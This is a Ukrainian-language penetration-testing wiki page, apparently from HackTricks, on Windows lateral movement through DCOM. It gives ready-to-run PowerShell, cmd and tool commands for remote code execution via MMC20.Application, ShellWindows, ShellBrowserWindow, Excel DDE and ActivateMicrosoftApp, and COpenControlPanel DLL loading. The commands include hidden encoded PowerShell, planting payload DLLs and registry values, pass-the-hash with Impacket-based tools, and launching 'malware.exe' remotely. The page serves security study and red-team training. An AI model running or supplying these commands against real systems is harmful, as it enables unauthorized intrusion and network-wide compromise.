# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Lateral movement через DCOM привабливий тим, що використовує наявні COM-сервери, доступні через RPC/DCOM, замість створення служби чи запланованого завдання. На практиці початкове з’єднання зазвичай встановлюється через TCP/135, а потім переходить на динамічно призначені високі порти RPC.

## Передумови та підводні камені

- Зазвичай на цільовій системі потрібен контекст локального адміністратора, а віддалений COM-сервер має дозволяти віддалений запуск/активацію.
- Починаючи з **14 березня 2023 року**, Microsoft застосовує посилений захист DCOM у підтримуваних системах. Старі клієнти, які запитують низький рівень автентифікації активації, можуть не працювати, якщо не узгодять принаймні `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. У сучасних клієнтах Windows рівень зазвичай підвищується автоматично, тому поточні інструменти зазвичай продовжують працювати.<sup>[[3]](#references)</sup>
- Для ручного або скриптового виконання через DCOM зазвичай потрібен TCP/135, а також діапазон динамічних портів RPC цільової системи. Якщо ви використовуєте Impacket `dcomexec.py` і хочете отримати вивід команд, зазвичай також потрібен доступ до SMB-ресурсу `ADMIN$` (або іншого ресурсу зі змогою читання/запису).
- Якщо RPC/DCOM працює, але SMB заблоковано, `dcomexec.py -nooutput` усе одно може бути корисним для прихованого виконання.

Швидкі перевірки:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Щоб дізнатися більше про цю техніку, перегляньте [оригінальну публікацію про MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Об’єкти Distributed Component Object Model (DCOM) надають цікаві можливості для взаємодії з об’єктами через мережу. Microsoft надає вичерпну документацію як щодо DCOM, так і щодо Component Object Model (COM), доступну [тут для DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) і [тут для COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Список програм DCOM можна отримати за допомогою команди PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

Об’єкт COM [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) дає змогу створювати скрипти для операцій з оснастками MMC. Зокрема, цей об’єкт містить метод `ExecuteShellCommand` у `Document.ActiveView`. Докладніше про цей метод можна дізнатися [тут](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Перевірте, як він працює:<sup>[[6]](#references)</sup>

Ця можливість дає змогу виконувати команди через мережу за допомогою програми DCOM. Для віддаленої взаємодії з DCOM із правами адміністратора можна скористатися PowerShell:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Ця команда підключається до програми DCOM і повертає екземпляр об’єкта COM. Потім можна викликати метод ExecuteShellCommand, щоб виконати процес на віддаленому хості. Процес складається з таких кроків:

Перевірте методи:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Отримати RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Останній аргумент — це стиль вікна. Значення `7` залишає вікно згорнутим. З операційного погляду, виконання на основі MMC зазвичай призводить до того, що віддалений процес `mmc.exe` запускає ваш payload, на відміну від об’єктів, пов’язаних з Explorer, описаних нижче.

## ShellWindows & ShellBrowserWindow

**Докладніше про цю техніку див. в оригінальній публікації [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Було помічено, що для об’єкта **MMC20.Application** не задано специфічного для програми значення `LaunchPermission`.<sup>[[2]](#references)</sup> Саме по собі це не надає доступу: COM перевіряє ACL `DefaultLaunchPermission` комп’ютера та загальномашинні обмеження на запуск і доступ, якщо вони застосовуються.<sup>[[9]](#references)[[10]](#references)</sup> Докладніше можна дізнатися з [обговорення](https://twitter.com/tiraniddo/status/817532039771525120); також рекомендується використовувати OleView .NET від [@tiraniddo](https://twitter.com/tiraniddo), щоб фільтрувати об’єкти без явного дозволу на запуск.

Було виділено два конкретні об’єкти — `ShellBrowserWindow` і `ShellWindows` — через відсутність у них явних дозволів на запуск.<sup>[[2]](#references)</sup> Відсутність значення `LaunchPermission` у `HKCR:\AppID\{guid}` означає, що немає специфічного для програми ACL запуску; це **не** означає, що віддалена активація нічим не обмежена.<sup>[[9]](#references)[[10]](#references)</sup>

Порівняно з `MMC20.Application`, з погляду OPSEC ці об’єкти часто менш помітні, оскільки команда зазвичай запускається як дочірній процес `explorer.exe` на віддаленому хості, а не `mmc.exe`.

### ShellWindows

Для `ShellWindows`, якому не відповідає ProgID, методи .NET `Type.GetTypeFromCLSID` і `Activator.CreateInstance` дають змогу створити екземпляр об’єкта за його CLSID. У цьому процесі OleView .NET використовується для отримання CLSID для `ShellWindows`. Після створення екземпляра з ним можна взаємодіяти через метод `WindowsShell.Item`, що дає змогу викликати методи на кшталт `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Наведено приклади команд PowerShell для створення екземпляра об’єкта та віддаленого виконання команд:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` схожий, але його можна створити безпосередньо через його CLSID і перейти до `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Латеральне переміщення за допомогою об’єктів Excel DCOM

Латерального переміщення можна досягти, використовуючи об’єкти Excel DCOM. Докладніше про це можна дізнатися з обговорення використання Excel DDE для латерального переміщення через DCOM у [блозі Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Проєкт Empire містить скрипт PowerShell, який демонструє використання Excel для віддаленого виконання коду (RCE) шляхом маніпуляцій з об’єктами DCOM. Нижче наведено фрагменти скрипту з [репозиторію Empire на GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), що демонструють різні способи використання Excel для RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Нещодавні дослідження розширили цю тему, додавши метод `ActivateMicrosoftApp()` у `Excel.Application`. Основна ідея полягає в тому, що Excel може намагатися запускати застарілі програми Microsoft, як-от FoxPro, Schedule Plus або Project, шукаючи їх у системному `PATH`. Якщо оператор може розмістити payload з одним із очікуваних імен у доступному для запису каталозі, який входить до `PATH` цільової системи, Excel виконає його.<sup>[[4]](#references)</sup>

Вимоги для цього варіанта:

- Локальний адміністратор на цільовій системі
- На цільовій системі встановлено Excel
- Можливість записати payload у доступний для запису каталог у `PATH` цільової системи

Практичний приклад експлуатації пошуку FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Якщо на атакуючому хості локально не зареєстровано ProgID `Excel.Application`, створіть віддалений об’єкт за CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Значення, зловживання якими траплялося на практиці:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — завантаження зареєстрованої DLL панелі керування

Клас `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) надає інтерфейс `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Його метод `Open()` змушує віддалений `dllhost.exe` завантажити DLL панелі керування, зареєстровані в розділі `Control Panel\Cpls`. У перевірених системах для цього класу не задано явних дозволів на запуск/доступ, тому він успадковує стандартну політику DCOM (зазвичай для віддаленої активації потрібні права адміністратора). Щоб `Open()` обробив зареєстровані DLL, достатньо довільного імені елемента; payload не обов’язково має розширення `.cpl`, але це має бути дійсна DLL відповідної архітектури.<sup>[[7]](#references)</sup>

Цей примітив використовує схему **підготовки та запуску**, а не лише виконання команд: спочатку скопіюйте DLL на цільову систему й створіть значення `REG_EXPAND_SZ`, що вказує на неї, а потім активуйте об’єкт через DCOM. Наприклад, у Windows із правами адміністратора:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Публічний клієнт [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) реалізує недокументований виклик DCOM за допомогою Impacket. Достатньо вказати довільну назву елемента Панелі керування; клієнт може повідомити про помилку RPC, навіть якщо `dllhost.exe` завантажив DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

З операційного погляду цей шлях також потребує каналу запису файлів і віддаленого доступу до реєстру, тому він помітніший, ніж `MMC20`/`ShellWindows`. Він створює побічний ефект у вигляді persistence, оскільки під час наступного відкриття Control Panel той самий запис може завантажитися знову. Після виконання видаліть значення та шукайте неочікувані значення в `Control Panel\Cpls` разом із незвичними завантаженнями DLL у `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Засоби автоматизації для lateral movement

Для автоматизації цих технік виділено два інструменти:

- **Invoke-DCOM.ps1**: PowerShell-скрипт, наданий проєктом Empire, який спрощує виклик різних методів виконання коду на віддалених машинах. Скрипт доступний у репозиторії Empire на GitHub.

- **SharpLateral**: Інструмент для віддаленого виконання коду, який можна використовувати за допомогою команди:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Автоматизовані інструменти

- Скрипт Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) дає змогу легко скористатися всіма описаними способами виконання коду на інших машинах.
- За допомогою `dcomexec.py` з Impacket можна виконувати команди на віддалених системах через DCOM. Поточні збірки підтримують `ShellWindows`, `ShellBrowserWindow` і `MMC20`, а за замовчуванням використовують `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Також можна скористатися [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Також можна скористатися [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Латеральне переміщення за допомогою COM-об’єкта MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Латеральне переміщення через DCOM: раунд 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — керування змінами для обходу функції безпеки Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Латеральне переміщення: використання можливостей DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Використання Excel DDE для латерального переміщення через DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com — клас MMC Application (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Використання об’єктів DCOM для віддаленого виконання команд](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Додаток B. Поведінка продукту — Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
